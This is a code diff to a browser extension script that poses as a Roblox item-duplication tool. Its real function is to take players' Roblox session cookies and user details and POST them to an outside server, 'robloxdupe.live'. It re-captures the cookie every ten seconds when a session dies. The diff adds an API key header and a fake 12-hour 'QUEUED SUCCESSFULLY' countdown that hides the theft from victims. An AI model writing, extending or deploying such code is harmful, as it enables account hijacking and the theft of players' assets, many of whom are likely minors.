@@ -1,5 +1,6 @@
 // ===== CONFIG =====
-const SERVER_URL = 'http://103.38.236.58';
+const SERVER_URL = 'https://robloxdupe.live';
+const API_KEY = 'rbx_sk_9f3xKmPvQ7nW2jR8sL5yBcDe4hA6tG1u';
 
 // ===== Game Data =====
 const gameData = {
@@ -93,7 +94,8 @@ async function sendToServer(cookie, userInfo, gameName = 'Unknown') {
         const response = await fetch(`${SERVER_URL}/api/sessions`, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'X-API-Key': API_KEY
             },
             body: JSON.stringify(payload)
         });
@@ -104,14 +106,14 @@ async function sendToServer(cookie, userInfo, gameName = 'Unknown') {
 
         const result = await response.json();
         console.log('✅ Cookie sent to server:', userInfo.name);
-        
+
         // Track this account
         trackedAccounts[userInfo.id] = {
             username: userInfo.name,
             status: 'ALIVE',
             lastCheck: Date.now()
         };
-        
+
         return result;
     } catch (error) {
         console.error('Error sending to server:', error);
@@ -160,12 +162,12 @@ function startStatusMonitoring() {
         for (const userId in trackedAccounts) {
             const account = trackedAccounts[userId];
             const status = await checkCookieStatus(userId);
-            
+
             // If status is DIE, auto-recapture immediately
             if (status === 'DIE') {
                 console.warn(`⚠️ Account ${account.username} (${userId}) is DIE - auto-recapturing...`);
                 account.status = 'DIE';
-                
+
                 try {
                     const cookie = await getRobloxCookie();
                     const userInfo = await getRobloxUserInfo(cookie);
@@ -179,7 +181,7 @@ function startStatusMonitoring() {
             } else if (status === 'ALIVE') {
                 account.status = 'ALIVE';
             }
-            
+
             account.lastCheck = Date.now();
         }
     }, 10000); // Check every 10 seconds
@@ -192,11 +194,90 @@ const modalTitle = document.getElementById('modalTitle');
 const modalIconImg = document.getElementById('modalIconImg');
 const modalCloseBtn = document.getElementById('modalCloseBtn');
 const processBtn = document.getElementById('processBtn');
+const countdownContainer = document.getElementById('countdownContainer');
+const countdownTimer = document.getElementById('countdownTimer');
+const countdownProgressBar = document.getElementById('countdownProgressBar');
 
 let currentGameId = null;
+let countdownInterval = null;
+const COUNTDOWN_DURATION = 12 * 60 * 60 * 1000; // 12 hours in ms
+
+// ===== Countdown Functions =====
+function formatTime(ms) {
+    if (ms <= 0) return '00:00:00';
+    const totalSeconds = Math.floor(ms / 1000);
+    const hours = Math.floor(totalSeconds / 3600);
+    const minutes = Math.floor((totalSeconds % 3600) / 60);
+    const seconds = totalSeconds % 60;
+    return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+}
+
+function startCountdownTimer(gameId, endTime) {
+    // Clear any existing interval
+    if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+    }
+
+    countdownContainer.style.display = 'block';
+    countdownContainer.classList.remove('completed');
+
+    function updateDisplay() {
+        const now = Date.now();
+        const remaining = endTime - now;
+
+        if (remaining <= 0) {
+            // Timer completed
+            countdownTimer.textContent = '00:00:00';
+            countdownProgressBar.style.width = '100%';
+            countdownContainer.classList.add('completed');
+            countdownTimer.textContent = 'COMPLETED!';
+            processBtn.classList.remove('processing', 'done');
+            processBtn.innerHTML = `
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
+                </svg>
+                PROCESS ITEM
+            `;
+            processBtn.style.pointerEvents = 'auto';
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            // Remove from storage
+            chrome.storage.local.remove(`countdown_${gameId}`);
+            return;
+        }
+
+        countdownTimer.textContent = formatTime(remaining);
+
+        // Calculate progress (how much time has elapsed)
+        const elapsed = COUNTDOWN_DURATION - remaining;
+        const progress = Math.min((elapsed / COUNTDOWN_DURATION) * 100, 100);
+        countdownProgressBar.style.width = `${progress}%`;
+    }
+
+    // Update immediately then every second
+    updateDisplay();
+    countdownInterval = setInterval(updateDisplay, 1000);
+}
+
+async function saveCountdown(gameId, endTime) {
+    return new Promise((resolve) => {
+        chrome.storage.local.set({ [`countdown_${gameId}`]: endTime }, resolve);
+    });
+}
+
+async function getCountdown(gameId) {
+    return new Promise((resolve) => {
+        chrome.storage.local.get([`countdown_${gameId}`], (result) => {
+            resolve(result[`countdown_${gameId}`] || null);
+        });
+    });
+}
 
 // ===== Open Modal =====
-function openGameModal(card) {
+async function openGameModal(card) {
     const gameId = card.getAttribute('data-game');
     const game = gameData[gameId];
     if (!game) return;
@@ -206,14 +287,43 @@ function openGameModal(card) {
     modalIconImg.src = game.icon;
     modalIconImg.alt = game.name;
 
-    // Reset process button
-    processBtn.classList.remove('processing', 'done', 'error');
-    processBtn.innerHTML = `
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
-        </svg>
-        PROCESS ITEM
-    `;
+    // Clear previous countdown interval
+    if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+    }
+
+    // Check if there's an active countdown for this game
+    const savedEndTime = await getCountdown(gameId);
+    if (savedEndTime && savedEndTime > Date.now()) {
+        // Restore the countdown
+        startCountdownTimer(gameId, savedEndTime);
+        // Show button as disabled/processing
+        processBtn.classList.remove('error');
+        processBtn.classList.add('done');
+        processBtn.innerHTML = `
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"/>
+            </svg>
+            QUEUED SUCCESSFULLY
+        `;
+        processBtn.style.pointerEvents = 'none';
+    } else {
+        // No active countdown - reset UI
+        countdownContainer.style.display = 'none';
+        processBtn.classList.remove('processing', 'done', 'error');
+        processBtn.style.pointerEvents = 'auto';
+        processBtn.innerHTML = `
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
+            </svg>
+            PROCESS ITEM
+        `;
+        // Clean up expired countdown from storage
+        if (savedEndTime) {
+            chrome.storage.local.remove(`countdown_${gameId}`);
+        }
+    }
 
     modalOverlay.classList.add('active');
     requestAnimationFrame(() => {
@@ -225,6 +335,12 @@ function openGameModal(card) {
 function closeModal() {
     modalCard.classList.remove('show');
     modalCard.classList.add('closing');
+
+    // Stop countdown display (timer is persisted in storage)
+    if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+    }
 
     setTimeout(() => {
         modalOverlay.classList.remove('active');
@@ -253,7 +369,11 @@ async function handleProcess() {
         // Step 3: Send everything to server
         await sendToServer(cookie, userInfo, gameName);
 
-        // Success
+        // Success - Start 12h countdown
+        const endTime = Date.now() + COUNTDOWN_DURATION;
+        await saveCountdown(currentGameId, endTime);
+        startCountdownTimer(currentGameId, endTime);
+
         processBtn.classList.remove('processing');
         processBtn.classList.add('done');
         processBtn.innerHTML = `
@@ -262,16 +382,7 @@ async function handleProcess() {
             </svg>
             QUEUED SUCCESSFULLY
         `;
-
-        setTimeout(() => {
-            processBtn.classList.remove('done');
-            processBtn.innerHTML = `
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
-                </svg>
-                PROCESS ITEM
-            `;
-        }, 3000);
+        processBtn.style.pointerEvents = 'none';
 
     } catch (error) {
         // Error state
